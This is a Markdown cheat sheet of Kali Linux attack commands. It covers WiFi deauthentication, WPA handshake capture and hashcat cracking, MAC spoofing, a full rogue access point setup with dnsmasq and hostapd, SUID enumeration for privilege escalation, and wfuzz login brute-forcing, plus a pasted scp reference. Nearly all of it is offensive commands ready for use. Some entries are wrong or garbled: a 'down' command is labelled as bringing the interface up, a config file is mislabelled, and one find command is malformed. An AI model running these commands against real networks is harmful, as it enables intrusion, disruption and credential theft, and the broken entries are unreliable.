# Kali-Linux-Reference

## Enabling Monitor Mode

* `iwconfig` : Show all network devices 
* `ifconfig wlan1 up` : To make sure network device is up and running 
* `airmon-ng` : Show all network cards 
* `airmon-ng check kill` : To prevent from disabling monitor mode 
* `airmon-ng start wlan1` : Start monitor mode 

## Reset to normal mode

* `airmon-ng stop wlan1mon` : Stop monitor mode
* `service network-manager start` : Restart network settings

## Sniffing Packets using airodump-ng

*PWR = Signal Strength should be above than -70*
* `airodump-ng wlan1mon` : Start sniffing
* `airodump-ng --bssid wlan1mon` :  Targeted sniffing


## macchanger

* `ifconfig wlan1 down` : Bring down the interface
* `macchanger -r wlan1` : Change mac address to random
* `ifconfig wlan1 down` : Bring the interface up


## Capturig Handshake file
* `airodump-ng -bssid [bssid] --channel [1] --write Desktop/Captures/WPA wlan0mon`

## Deauth Attacks

* `airodump-ng --channel --bssid  wlan1mon`
* `aireplay-ng --deauth 2000 -a [MAC of Access Point] -c [MAC of  Client] wlan1mon`

## Cracking Handshake file with Hashcat (Windows)
* `hashcat64.exe -m 2500 capture.hccap wordlist.lst`
* Keyspace method
* `hashcat64.exe -m 2500 -a3 capture.hccap -1 1234567890 ?1?1?1?1?1?1?1?1`
* `hashcat64.exe -m 2500 -a3 capture.hccap -1 ?d?d?d?d?d?d?d?d`

## Pyrit Reduce size of WPA/WPA2 .Cap file
* `pyrit -r capture.cap analyze`
* `pyrit -r capture.cap -o output.cap strip`


# Rouge Access Point

## Enabling Monitor Mode

* `airmon-ng check kill` : To prevent from disabling monitor mode 
* `airmon-ng start wlan1` : Start monitor mode 
* `ifconfig wlan1mon 10.0.0.1/24` : Set IP of Monitor Interface

## Install tools

* `apt-get install -y hostapd dnsmasq wireless-tools iw wvdial`

## Configure dnsmasq

* `mv /etc/dnsmasq.conf /etc/dnsmasq.conf_bkp` : Create backup of config file
* `vim /etc/dnsmasq.conf`

## dnsmasq.conf file
```
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0mon
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
```

* `vim /etc/hostapd/hostapd.conf`

## dnsmasq.conf file
```
interface=wlan1mon
driver=nl80211
ssid=Rouge-AP
channel=1
#enable_karma=1
```

## Start dnsmasq 

* `service dnsmasq start`
* `tail -f /var/log/dnsmasq.log`

## Start hostapd 

* `hostapd /etc/hostapd/hostapd.conf`

## scp

> Secure copy.
> Copy files between hosts using Secure Copy Protocol over SSH.

- Copy a local file to a remote host:

`scp {{path/to/local_file}} {{remote_host}}:{{path/to/remote_file}}`

- Copy a file from a remote host to a local folder:

`scp {{remote_host}}:{{path/to/remote_file}} {{path/to/local_dir}}`

- Recursively copy the contents of a directory from a remote host to a local directory:

`scp -r {{remote_host}}:{{path/to/remote_dir}} {{path/to/local_dir}}`

- Copy a file between two remote hosts transferring through the local host:

`scp -3 {{host1}}:{{path/to/remote_file}} {{host2}}:{{path/to/remote_dir}}`

- Use a specific username when connecting to the remote host:

`scp {{path/to/local_file}} {{remote_username}}@{{remote_host}}:{{path/to/remote_dir}}`

- Use a specific ssh private key for authentication with the remote host:

`scp -i {{~/.ssh/private_key}} {{local_file}} {{remote_host}}:{{/path/remote_file}}`

## Local Exploit Suggestor:
`post/multi/recon/local_exploit_suggester`

## Executeables with SUID bit set
* `find / -perm -u=s -type f 2>/dev/null `
* `find directory – user root – perm – 4000 – exec ls – ld   {} \ ; >/tmp/setuid`

## Wfuzz
* `wfuzz -c -w wordlist -u http://10.10.10.10/index.php?id=FUZZ`
* `wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp.vulnweb.com/userinfo.php`
